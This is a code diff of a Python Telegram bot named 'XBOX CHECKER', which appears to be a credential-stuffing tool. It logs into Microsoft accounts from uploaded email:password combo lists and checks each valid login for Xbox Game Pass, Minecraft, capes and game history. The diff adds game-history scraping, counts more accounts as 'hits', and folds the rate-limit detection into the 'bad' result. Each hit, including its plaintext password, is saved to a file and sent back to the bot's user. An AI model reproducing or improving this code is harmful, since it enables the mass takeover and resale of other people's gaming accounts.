@@ -1,4 +1,4 @@
-# idk.py
+# cosmo_xbox_bot.py
 import asyncio
 import subprocess
 import sys
@@ -57,7 +57,7 @@ warnings.filterwarnings("ignore")
 # ══════════════════════════════════════════════
 # BOT CONFIGURATION
 BOT_NAME = "✨ XBOX CHECKER"
-BOT_VERSION = "v3.2-RATELIMIT-FIXED"
+BOT_VERSION = "v3.0-PRO"
 OWNER_USERNAME = "@kudsoo"
 OWNER_NAME = "Kudasai"
 BOT_CHANNEL = "https://t.me/kudsiontop"
@@ -384,9 +384,7 @@ def microsoft_auth(session, email, password, url_post, sftag, max_attempts=MAX_R
                     pass
             elif any(v in login_request.text for v in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                 return None, "2fa"
-            elif "tried to sign in too many times" in login_request.text.lower() or "blocked" in login_request.text.lower():
-                return None, "ratelimit"
-            elif any(v in login_request.text.lower() for v in ["password is incorrect", "account doesn't exist", "sign in to your microsoft account"]):
+            elif any(v in login_request.text.lower() for v in ["password is incorrect", "account doesn't exist", "sign in to your microsoft account", "tried to sign in too many times"]):
                 return None, "bad"
         except:
             if attempt == max_attempts - 1:
@@ -475,23 +473,38 @@ def check_entitlements(session, mc_token, max_attempts=MAX_RETRIES):
                 timeout=REQUEST_TIMEOUT
             )
             if response.status_code == 200:
-                text = response.text
-                if 'product_game_pass_ultimate' in text:
-                    return 'Xbox Game Pass Ultimate', ["Xbox Game Pass Ultimate"]
-                elif 'product_game_pass_pc' in text or 'product_game_pass_console' in text:
-                    return 'Xbox Game Pass', ["Xbox Game Pass"]
-                elif '"product_minecraft"' in text or '"game_minecraft"' in text:
-                    return 'Minecraft', ["Minecraft Java"]
+                data = response.json()
+                items = data.get("items", [])
+                if not items:
+                    return None, []
+                
+                subs = []
+                for item in items:
+                    name = item.get("name", "")
+                    if name == "product_game_pass_ultimate":
+                        subs.append("Xbox Game Pass Ultimate")
+                    elif name == "product_game_pass_pc":
+                        subs.append("Xbox Game Pass PC")
+                    elif name == "product_game_pass_console":
+                        subs.append("Xbox Game Pass Console")
+                    elif name == "product_minecraft":
+                        subs.append("Minecraft Java")
+                    elif name == "product_minecraft_bedrock":
+                        subs.append("Minecraft Bedrock")
+                    elif name == "product_legends":
+                        subs.append("Minecraft Legends")
+                    elif name == "product_dungeons":
+                        subs.append("Minecraft Dungeons")
+                
+                if "Xbox Game Pass Ultimate" in subs:
+                    return "Xbox Game Pass Ultimate", subs
+                elif "Xbox Game Pass PC" in subs or "Xbox Game Pass Console" in subs:
+                    return "Xbox Game Pass", subs
+                elif "Minecraft Java" in subs:
+                    return "Minecraft", subs
+                elif subs:
+                    return "Xbox: " + ", ".join(subs), subs
                 else:
-                    others = []
-                    if 'product_minecraft_bedrock' in text:
-                        others.append("Bedrock")
-                    if 'product_legends' in text:
-                        others.append("Legends")
-                    if 'product_dungeons' in text:
-                        others.append("Dungeons")
-                    if others:
-                        return 'Xbox: ' + ', '.join(others), others
                     return None, []
             elif response.status_code == 429:
                 time.sleep(2)
@@ -499,8 +512,7 @@ def check_entitlements(session, mc_token, max_attempts=MAX_RETRIES):
             else:
                 return None, []
         except:
-            if attempt == max_attempts - 1:
-                return None, []
+            pass
         time.sleep(0.5)
     return None, []
 
@@ -531,7 +543,7 @@ def get_xbox_profile(session, uhs, xsts_token, max_attempts=MAX_RETRIES):
             auth_header = f"XBL3.0 x={uhs};{xsts_token}"
             response = session.get(
                 "https://profile.xboxlive.com/users/me/profile/settings"
-                "?settings=Gamertag,GameDisplayPicRaw,AccountTier",
+                "?settings=Gamertag,GameDisplayPicRaw,AccountTier,XboxOneRep",
                 headers={
                     "Authorization": auth_header,
                     "x-xbl-contract-version": "2",
@@ -549,7 +561,8 @@ def get_xbox_profile(session, uhs, xsts_token, max_attempts=MAX_RETRIES):
                 return {
                     "gamertag": settings.get("Gamertag", "N/A"),
                     "gamerpic": settings.get("GameDisplayPicRaw", ""),
-                    "tier": settings.get("AccountTier", "N/A")
+                    "tier": settings.get("AccountTier", "N/A"),
+                    "rep": settings.get("XboxOneRep", "N/A"),
                 }
             elif response.status_code == 429:
                 time.sleep(2)
@@ -557,7 +570,39 @@ def get_xbox_profile(session, uhs, xsts_token, max_attempts=MAX_RETRIES):
         except:
             pass
         time.sleep(0.3)
-    return {"gamertag": "N/A", "gamerpic": "", "tier": "N/A"}
+    return {"gamertag": "N/A", "gamerpic": "", "tier": "N/A", "rep": "N/A"}
+
+def get_xbox_games(session, uhs, xsts_token, max_attempts=MAX_RETRIES):
+    for attempt in range(max_attempts):
+        try:
+            auth_header = f"XBL3.0 x={uhs};{xsts_token}"
+            response = session.get(
+                "https://titlehub.xboxlive.com/users/me/titles/titlehistory/decoration/detail",
+                headers={
+                    "Authorization": auth_header,
+                    "x-xbl-contract-version": "2",
+                    "Accept": "application/json",
+                    "Accept-Language": "en-US",
+                },
+                timeout=REQUEST_TIMEOUT
+            )
+            if response.status_code == 200:
+                data = response.json()
+                titles = data.get("titles", [])
+                games = []
+                for t in titles:
+                    if t.get("titleType") == "Game":
+                        name = t.get("name")
+                        if name and name not in games:
+                            games.append(name)
+                return games
+            elif response.status_code == 429:
+                time.sleep(2)
+                continue
+        except:
+            pass
+        time.sleep(0.3)
+    return []
 
 def check_account_combo(email: str, password: str, user_id: int = None) -> dict:
     result = {
@@ -565,12 +610,14 @@ def check_account_combo(email: str, password: str, user_id: int = None) -> dict:
         "type": "bad",
         "email": email,
         "password": password,
-        "gamertag": "N/A",
-        "tier": "N/A",
-        "name": "Not Set",
+        "name": "N/A",
         "uuid": "N/A",
         "capes": "None",
+        "gamertag": "N/A",
         "subscriptions": "None",
+        "games": "None",
+        "tier": "N/A",
+        "rep": "N/A",
         "error": None
     }
 
@@ -585,17 +632,12 @@ def check_account_combo(email: str, password: str, user_id: int = None) -> dict:
 
         url_post, sftag = get_sftag(session)
         if not url_post or not sftag:
-            result["type"] = "error"
-            result["error"] = "Failed to get SFTag (Possible IP Block)"
+            result["error"] = "Failed to get SFTag"
             return result
 
         ms_token, auth_status = microsoft_auth(session, email, password, url_post, sftag)
 
-        if auth_status == "ratelimit":
-            result["type"] = "ratelimit"
-            result["error"] = "IP Rate Limited by Microsoft!"
-            return result
-        elif auth_status == "2fa":
+        if auth_status == "2fa":
             result["type"] = "2fa"
             result["error"] = "2FA Required"
             return result
@@ -623,23 +665,31 @@ def check_account_combo(email: str, password: str, user_id: int = None) -> dict:
         xbox_profile = get_xbox_profile(session, uhs, xsts_token)
         result["gamertag"] = xbox_profile.get("gamertag", "N/A")
         result["tier"] = xbox_profile.get("tier", "N/A")
+        result["rep"] = xbox_profile.get("rep", "N/A")
+
+        # Get Xbox Games!
+        xbox_games = get_xbox_games(session, uhs, xsts_token)
+        if xbox_games:
+            result["games"] = ", ".join(xbox_games[:10])
+            if len(xbox_games) > 10:
+                result["games"] += f" (+{len(xbox_games)-10} more)"
 
         mc_token = get_minecraft_token(session, uhs, xsts_token)
         if not mc_token:
-            result["type"] = "bad"
-            result["error"] = "Minecraft token failed"
+            # If no MC token, but they have Xbox Games, it's still a hit!
+            if xbox_games:
+                result["success"] = True
+                result["type"] = "Xbox Games"
+            else:
+                result["type"] = "bad"
+                result["error"] = "Minecraft token failed & No Games"
             return result
 
+        # Check accurate JSON parsed entitlements
         account_type, subs = check_entitlements(session, mc_token)
-        if not account_type:
-            result["success"] = False
-            result["type"] = "not_linked"
-            result["error"] = "Unlinked account"
-            return result
-
         result["subscriptions"] = ", ".join(subs) if subs else "None"
-        result["type"] = account_type
 
+        # Check Minecraft Profile
         profile = get_profile(session, mc_token)
         if profile and "id" in profile:
             result["name"] = profile.get('name', 'Not Set')
@@ -647,8 +697,24 @@ def check_account_combo(email: str, password: str, user_id: int = None) -> dict:
             result["capes"] = ", ".join([c["alias"] for c in profile.get("capes", [])])
             if not result["capes"]:
                 result["capes"] = "None"
-        
-        result["success"] = True
+            
+            # They definitely have Minecraft if they have a profile
+            if not account_type:
+                account_type = "Minecraft"
+
+        # Verify Hit
+        if not account_type and xbox_games:
+            account_type = "Xbox Games"
+
+        if account_type:
+            result["success"] = True
+            result["type"] = account_type
+        else:
+            # If no games and no subs, it's unlinked and won't be saved or sent!
+            result["success"] = False
+            result["type"] = "not_linked"
+            result["error"] = "No Games or Subscriptions"
+
         return result
 
     except Exception as e:
@@ -666,7 +732,6 @@ def check_account_combo(email: str, password: str, user_id: int = None) -> dict:
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 
-# COMPLETE EMOJI DICTIONARY - RESTORED
 EMOJIS = {
     "success": "✅",
     "error": "❌",
@@ -788,6 +853,7 @@ def get_admin_inline_menu() -> InlineKeyboardMarkup:
     builder = InlineKeyboardBuilder()
     builder.button(text=f"{EMOJIS['stats']} Bot Stats", callback_data="admin_stats")
     builder.button(text=f"{EMOJIS['users']} Users List", callback_data="admin_users")
+    builder.button(text=f"{EMOJIS['trophy']} Top Users", callback_data="admin_top")
     builder.button(text=f"{EMOJIS['queue']} Queue Status", callback_data="admin_queue")
     builder.button(text=f"{EMOJIS['back']} Back", callback_data="menu_back")
     builder.adjust(2)
@@ -828,8 +894,8 @@ def save_hit_to_file(result: dict):
         "Xbox Game Pass Ultimate": "gamepass",
         "Xbox Game Pass": "gamepass",
         "Minecraft": "minecraft",
-        "Xbox": "xbox",
-        "Xbox: Bedrock": "xbox"
+        "Xbox Games": "xbox",
+        "Xbox": "xbox"
     }
     folder_map = {
         "gamepass": "GamePass",
@@ -845,13 +911,15 @@ def save_hit_to_file(result: dict):
     capture = (
         f"Email         : {result['email']}\n"
         f"Password      : {result['password']}\n"
-        f"Xbox Gamertag : {result.get('gamertag', 'N/A')}\n"
+        f"Gamertag      : {result.get('gamertag', 'N/A')}\n"
         f"Tier          : {result.get('tier', 'N/A')}\n"
-        f"Minecraft Name: {result.get('name', 'Not Set')}\n"
-        f"UUID          : {result.get('uuid', 'N/A')}\n"
-        f"Capes         : {result.get('capes', 'None')}\n"
+        f"Reputation    : {result.get('rep', 'N/A')}\n"
+        f"MC Name       : {result['name']}\n"
+        f"UUID          : {result['uuid']}\n"
+        f"Capes         : {result['capes']}\n"
         f"Type          : {result['type']}\n"
         f"Subscriptions : {result['subscriptions']}\n"
+        f"Games         : {result.get('games', 'None')}\n"
         f"Captured By   : {MY_SIGNATURE}\n"
         f"{'='*50}"
     )
@@ -878,8 +946,6 @@ async def download_file_safely(file_id: str, file_name: str) -> Optional[str]:
 
 def format_check_result(result: dict) -> str:
     if not result["success"]:
-        if result["type"] == "ratelimit":
-            return f"⚠️ <b>{result['email']}</b>\n└ Microsoft Rate Limit Blocked IP"
         emoji = EMOJIS["error"] if result["type"] == "bad" else EMOJIS["warning"]
         return f"{emoji} <b>{result['email']}</b>\n└ {result['error'] or result['type']}"
 
@@ -887,25 +953,27 @@ def format_check_result(result: dict) -> str:
         "Xbox Game Pass Ultimate": EMOJIS["ultimate"],
         "Xbox Game Pass": EMOJIS["gamepass"],
         "Minecraft": EMOJIS["minecraft"],
+        "Xbox Games": EMOJIS["xbox"],
         "Xbox": EMOJIS["xbox"]
     }
     emoji = emoji_map.get(result["type"], EMOJIS["hit"])
 
-    return f"""💎 🎯 <b>HIT FOUND!</b>
+    return f"""{emoji} <b>🎯 HIT FOUND!</b>
 ╔════════════════════════════════
-║ 👤 <b>Email:</b> <code>{result['email']}</code>
-║ 🔑 <b>Password:</b> <code>{result['password']}</code>
+║ {EMOJIS['user']} <b>Email:</b> <code>{result['email']}</code>
+║ {EMOJIS['key']} <b>Password:</b> <code>{result['password']}</code>
 ╠════════════════════════════════
-║ 🕹️ <b>Xbox Gamertag:</b> {result.get('gamertag', 'N/A')}
-║ 🏆 <b>Tier:</b> {result.get('tier', 'N/A')}
-║ ⛏️ <b>Minecraft Name:</b> {result.get('name', 'Not Set')}
-║ 💎 <b>UUID:</b> <code>{result.get('uuid', 'N/A')}</code>
-║ ⭐ <b>Capes:</b> {result.get('capes', 'None')}
+║ {EMOJIS['xbox']} <b>Xbox Gamertag:</b> {result.get('gamertag', 'N/A')}
+║ {EMOJIS['trophy']} <b>Tier:</b> {result.get('tier', 'N/A')}
+║ {EMOJIS['minecraft']} <b>Minecraft Name:</b> {result['name']}
+║ {EMOJIS['gem']} <b>UUID:</b> <code>{result['uuid']}</code>
+║ {EMOJIS['star']} <b>Capes:</b> {result['capes']}
 ╠════════════════════════════════
-║ 🎯 <b>Type:</b> {result['type']}
-║ 🎁 <b>Subscriptions:</b> {result['subscriptions']}
+║ {EMOJIS['target']} <b>Type:</b> {result['type']}
+║ {EMOJIS['gift']} <b>Subscriptions:</b> {result['subscriptions']}
+║ 🎮 <b>Games:</b> {result.get('games', 'None')}
 ╚════════════════════════════════
-👑 <b>Captured By:</b> {MY_SIGNATURE}"""
+{EMOJIS['owner']} <b>Captured By:</b> {MY_SIGNATURE}"""
 
 # ══════════════════════════════════════════════
 # QUEUE PROCESSOR
@@ -946,7 +1014,7 @@ async def process_single_check(user_id: int, data: dict, message):
         db.use_check(user_id)
         user = db.get_user(user_id)
         await message.answer(
-            f"{EMOJIS['stats']} <b>Total Checks:</b> {user.get('total_checks', 0)} | 🎯 <b>Hits:</b> {user.get('hits', 0)}",
+            f"{EMOJIS['stats']} <b>Total Checks:</b> {user.get('total_checks', 0)} | {EMOJIS['target']} <b>Hits:</b> {user.get('hits', 0)}",
             parse_mode="HTML"
         )
     else:
@@ -979,7 +1047,7 @@ async def process_file_check(user_id: int, data: dict, message):
         total = len(combos)
         progress_msg = await message.answer(f"{EMOJIS['processing']} <b>Checking {total} accounts...</b>\n\n0/{total} done", parse_mode="HTML")
         
-        results = {"hits": [], "bad": 0, "2fa": 0, "ratelimit": 0, "errors": 0}
+        results = {"hits": [], "bad": 0, "2fa": 0, "errors": 0}
         checked = 0
         
         for combo in combos:
@@ -997,23 +1065,21 @@ async def process_file_check(user_id: int, data: dict, message):
                 results["bad"] += 1
             elif result["type"] == "2fa":
                 results["2fa"] += 1
-            elif result["type"] == "ratelimit":
-                results["ratelimit"] += 1
             else:
                 results["errors"] += 1
             
             checked += 1
             db.use_check(user_id)
             
+            # Safely update progress without hitting Telegram Rate Limits
             if checked % 5 == 0 or checked == total:
                 user = db.get_user(user_id)
                 try:
                     await progress_msg.edit_text(
                         f"{EMOJIS['processing']} <b>Checking File ({checked}/{total})...</b>\n"
                         f"🔍 <b>Last Checked:</b> <code>{email}:{password}</code>\n\n"
-                        f"🎯 Hits: {len(results['hits'])}\n"
+                        f"{EMOJIS['target']} Hits: {len(results['hits'])}\n"
                         f"{EMOJIS['error']} Bad/Dead: {results['bad']}\n"
-                        f"⚠️ Rate Limits: {results['ratelimit']}\n"
                         f"{EMOJIS['twofa']} 2FA: {results['2fa']}\n"
                         f"{EMOJIS['warning']} Errors: {results['errors']}\n"
                         f"{EMOJIS['stats']} Total Checks: {user.get('total_checks', 0)}",
@@ -1025,9 +1091,8 @@ async def process_file_check(user_id: int, data: dict, message):
         await message.answer(
             f"{EMOJIS['success']} <b>File Check Complete!</b>\n\n"
             f"{EMOJIS['stats']} Total: {checked}/{total}\n"
-            f"🎯 Hits: {len(results['hits'])}\n"
+            f"{EMOJIS['target']} Hits: {len(results['hits'])}\n"
             f"{EMOJIS['error']} Bad: {results['bad']}\n"
-            f"⚠️ Rate Limits: {results['ratelimit']}\n"
             f"{EMOJIS['twofa']} 2FA: {results['2fa']}\n"
             f"{EMOJIS['warning']} Errors: {results['errors']}",
             parse_mode="HTML"
@@ -1064,13 +1129,13 @@ async def cmd_start(message: types.Message):
     
     welcome_text = f"""🌟 <b>Welcome to {BOT_NAME}!</b>{admin_tag}
 ╔════════════════════════════════
-║ {EMOJIS['xbox']} Xbox Account Checker
+║ {EMOJIS['xbox']} Xbox & Minecraft Account Checker
 ║ {EMOJIS['info']} Version: {BOT_VERSION}
 ║ {EMOJIS['owner']} Owner: {OWNER_USERNAME}
 ╠════════════════════════════════
 ║ {EMOJIS['access']} <b>Access:</b> {access_text}
 ║ {EMOJIS['stats']} <b>Total Checks:</b> {user.get('total_checks', 0)}
-║ 🎯 <b>Hits Found:</b> {user.get('hits', 0)}
+║ {EMOJIS['target']} <b>Hits Found:</b> {user.get('hits', 0)}
 ║ {proxy_info}
 ╚════════════════════════════════
 
@@ -1171,8 +1236,8 @@ async def menu_stats(message: types.Message):
 ╠════════════════════════════════
 ║ {EMOJIS['access']} <b>Access:</b> {access_text}
 ║ {EMOJIS['stats']} <b>Total Checks:</b> {total_checks}
-║ 🎯 <b>Hits Found:</b> {hits}
-║ ⚡ <b>Efficiency:</b> {efficiency}
+║ {EMOJIS['target']} <b>Hits Found:</b> {hits}
+║ {EMOJIS['thunder']} <b>Efficiency:</b> {efficiency}
 ╠════════════════════════════════
 ║ {EMOJIS['proxy']} <b>Proxy:</b> {proxy_info}
 ║ {EMOJIS['queue']} <b>Queue Position:</b> {queue_text}
@@ -1182,7 +1247,7 @@ async def menu_stats(message: types.Message):
 
 @dp.message(F.text == f"{EMOJIS['about']} About Bot")
 async def menu_about(message: types.Message):
-    await message.answer(f"Xbox Checker v{BOT_VERSION}\nOwner: {OWNER_USERNAME}", parse_mode="HTML")
+    await message.answer(f"Xbox & Minecraft Checker v{BOT_VERSION}\nOwner: {OWNER_USERNAME}", parse_mode="HTML")
 
 @dp.message(F.text == f"{EMOJIS['owner']} Owner")
 async def menu_owner(message: types.Message):
@@ -1300,7 +1365,7 @@ async def admin_users(callback: types.CallbackQuery):
 async def main():
     print(f"{Fore.GREEN}✓ Starting queue processor...{Style.RESET_ALL}")
     asyncio.create_task(process_queue())
-    print(f"{Fore.GREEN}✓ Bot is running (KeyError fixed!)...{Style.RESET_ALL}")
+    print(f"{Fore.GREEN}✓ Bot is running with Pro Features (Games & Precise MC Parsing)...{Style.RESET_ALL}")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
